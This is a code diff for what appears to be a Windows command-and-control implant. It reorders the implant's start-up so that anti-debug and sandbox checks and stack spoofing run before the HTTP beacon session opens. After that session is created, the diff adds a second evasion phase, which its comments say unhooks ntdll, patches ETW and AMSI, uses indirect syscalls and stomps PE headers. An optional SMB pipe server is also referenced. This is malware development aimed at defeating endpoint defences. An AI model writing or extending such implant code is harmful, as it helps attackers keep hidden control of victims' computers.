@@ -171,12 +171,15 @@ BOOL agent_init(AgentState *state) {
 
     DBG("[init] agent_init starting, sleep=%d jitter=%d", CONFIG_SLEEP_MS, CONFIG_JITTER_PCT);
 
-    /* Evasion: load-time anti-analysis + run-time patches (AMSI/ETW/ntdll) */
-    if (!evasion_init()) {
-        DBG("[init] evasion_init FAILED — anti-debug/sandbox triggered, exiting");
+    /*
+     * Evasion Phase 1 — PRE-CONNECT: anti-analysis + stack spoof.
+     * These are safe before WinHTTP — they don't touch ntdll/ETW.
+     */
+    if (!evasion_init_pre_connect()) {
+        DBG("[init] evasion pre-connect FAILED — anti-debug/sandbox triggered, exiting");
         return FALSE;
     }
-    DBG("[init] evasion_init OK");
+    DBG("[init] evasion pre-connect OK");
 
     generate_agent_id(state->agent_id);
     DBG("[init] agent_id generated");
@@ -187,7 +190,9 @@ BOOL agent_init(AgentState *state) {
     }
     DBG("[init] crypto_init OK");
 
-    /* Register and initialize channels */
+    /* Register and initialize channels — WinHttpOpen happens here.
+     * Must run BEFORE evasion post-connect patches ntdll/ETW/AMSI,
+     * because WinHTTP uses ETW internally during session init. */
     channels_register();
     DBG("[init] channels registered, count=%d", g_channel_count);
 
@@ -196,6 +201,17 @@ BOOL agent_init(AgentState *state) {
         return FALSE;
     }
     DBG("[init] channel_init_active OK (HTTP session created)");
+
+    /*
+     * Evasion Phase 2 — POST-CONNECT: unhook ntdll, patch ETW/AMSI,
+     * init indirect syscalls, stomp PE headers.
+     * Safe now — WinHTTP session handle is already created.
+     */
+    if (!evasion_init_post_connect()) {
+        DBG("[init] evasion post-connect FAILED");
+        return FALSE;
+    }
+    DBG("[init] evasion post-connect OK");
 
     /* Start SMB pipe server if configured */
     if (CONFIG_PIPE_ENABLED == 1)
